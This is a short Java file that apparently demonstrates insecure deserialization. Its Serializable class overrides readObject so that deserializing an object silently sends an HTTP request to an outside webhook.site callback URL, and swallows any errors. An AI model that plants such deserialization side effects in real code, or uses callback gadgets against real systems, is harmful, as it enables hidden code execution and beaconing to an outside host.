import java.io.*;
import java.net.*;

class VulneurableClass implements Serializable {

  public VulneurableClass() {
    //    try {
    //      System.out.println("Ckeck class Object created ");
    //    } catch (Exception e) {
    //      e.printStackTrace();
    //    }
  }

  private void writeObject(ObjectOutputStream oos) throws IOException {
    //    System.out.println("Custom serialization logic invoked.");
    oos.defaultWriteObject(); // Calling the default serialization logic
  }

  // overiding readObject method
  private void readObject(ObjectInputStream ois)
    throws IOException, ClassNotFoundException {
    //    System.out.println("Custom deserialization logic invoked.");
    // The code written here will get executed while serializing
    try {
      URL url = new URL(
        "https://webhook.site/04188e68-68cd-4816-9e7e-4b2b5d038245"
      );
      HttpURLConnection con = (HttpURLConnection) url.openConnection();
      con.setRequestMethod("GET");
      BufferedReader rd = new BufferedReader(
        new InputStreamReader(con.getInputStream())
      );
    } catch (Exception e) {
      //      e.printStackTrace();
    }
    ois.defaultReadObject(); // Calling the default deserialization logic.
  }
}

public class Checks {

  public static void main(String[] args) {
    try {
      String filename = "vulneurabl.ser";
      VulneurableClass obj = new VulneurableClass();

      // Serialize the class and store it into a file
      File f = new File(filename);
      ObjectOutputStream out;
      out = new ObjectOutputStream(new FileOutputStream(f));
      out.writeObject(obj);
      out.flush();
      out.close();

      // Use the serialized class in the file to deserialize using readObject
      ObjectInputStream in = new ObjectInputStream(
        new FileInputStream(filename)
      );
      Object object = in.readObject(); // vulneurabl code
      System.out.println(object);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
